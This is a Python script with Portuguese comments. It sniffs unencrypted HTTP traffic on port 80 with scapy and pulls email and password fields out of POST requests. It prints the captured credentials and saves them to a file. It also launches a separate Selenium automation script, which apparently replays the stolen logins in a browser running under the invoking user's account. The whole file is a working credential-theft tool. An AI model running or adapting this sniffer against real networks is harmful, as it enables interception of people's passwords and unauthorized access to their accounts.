import os
import sys
from scapy.all import sniff, Raw
from urllib.parse import unquote
import subprocess
import threading

# Define caminhos absolutos para evitar erros no subprocesso
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ARQUIVO_SAIDA = os.path.join(BASE_DIR, "captura.txt")
ARQUIVO_TEMP = os.path.join(BASE_DIR, "captura.tmp")

# Tente localizar o python do venv dinamicamente ou use o caminho fixo
if sys.prefix != sys.base_prefix:
    # Está rodando num venv
    python_exec = sys.executable
else:
    # Caminho manual caso não esteja ativo o venv no shell atual
    python_exec = os.path.join(BASE_DIR, ".venv/bin/python")

def get_demote_function():
    """
    Retorna uma função que configura o UID/GID para o usuário original
    que chamou o sudo. Isso impede que o Firefox rode como root.
    """
    uid = os.environ.get('SUDO_UID')
    gid = os.environ.get('SUDO_GID')

    if uid and gid:
        def demote():
            os.setgid(int(gid))
            os.setuid(int(uid))

        return demote
    return None

def monitorar_logs_selenium(proc):
    """ Corrige o bug visual de 'escada' nos logs """
    while True:
        line = proc.stdout.readline()
        if not line and proc.poll() is not None:
            break
        if line:
            texto = line.strip()
            if texto:
                sys.stdout.write(f"{texto}\r\n")
                sys.stdout.flush()

def salvar_credenciais(email, senha):
    """
    Escreve num arquivo temporário e renomeia.
    Isso evita que o Selenium leia o arquivo enquanto ele ainda está sendo escrito.
    """
    try:
        with open(ARQUIVO_TEMP, "w", encoding="utf-8") as f:
            f.write(f"{email} {senha}")
            f.flush()
            os.fsync(f.fileno())

        # A renomeação é atômica em sistemas POSIX (Linux/Mac)
        os.replace(ARQUIVO_TEMP, ARQUIVO_SAIDA)
        print(f"[disk] Credenciais salvas para automação: {email}")
    except Exception as e:
        print(f"[erro] Falha ao salvar credenciais: {e}")


def processar(pacote):
    if pacote.haslayer(Raw):
        try:
            data = pacote[Raw].load.decode(errors="ignore").lower()

            if "post" in data and ("email=" in data or "passwd=" in data):

                print("\n[🚨 DADOS CAPTURADOS 🚨]")
                print("-----------------------------------------")

                email = ""
                senha = ""

                if "email=" in data:
                    email_raw = data.split("email=", 1)[1].split("&")[0]
                    email = unquote(email_raw)
                    print(f"[EMAIL]  {email}")

                if "passwd=" in data:
                    pass_raw = data.split("passwd=", 1)[1].split("&")[0]
                    senha = unquote(pass_raw)
                    print(f"[PASSWD] {senha}")

                # salva imediatamente no arquivo
                salvar_credenciais(email, senha)

                print("-----------------------------------------\n")

        except Exception as e:
            # print(e) # Descomente para debug
            pass


# Inicia o subprocesso garantindo que o output seja visível para debug
print(f"[*] Iniciando automação Selenium com: {python_exec}")
script_automacao = os.path.join(BASE_DIR, "selenium_automation.py")

demote_fn = get_demote_function()

# Popen sem pipes para que o Selenium possa usar o stdout se necessário,
# ou use pipes se quiser silenciar.
proc = subprocess.Popen(
    [python_exec, script_automacao],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True,
    bufsize=1,
    preexec_fn=demote_fn,  # <--- MÁGICA AQUI: O Selenium roda como seu usuário, não root
    cwd=BASE_DIR           # Garante que o diretório de trabalho seja o correto
)
print("[*] Sniffer ativo. Aguardando POSTs...")

t = threading.Thread(target=monitorar_logs_selenium, args=(proc,), daemon=True)
t.start()

try:
    sniff(filter="tcp port 80", prn=processar, store=False)
except KeyboardInterrupt:
    print("\n[*] Encerrando...")
    proc.terminate()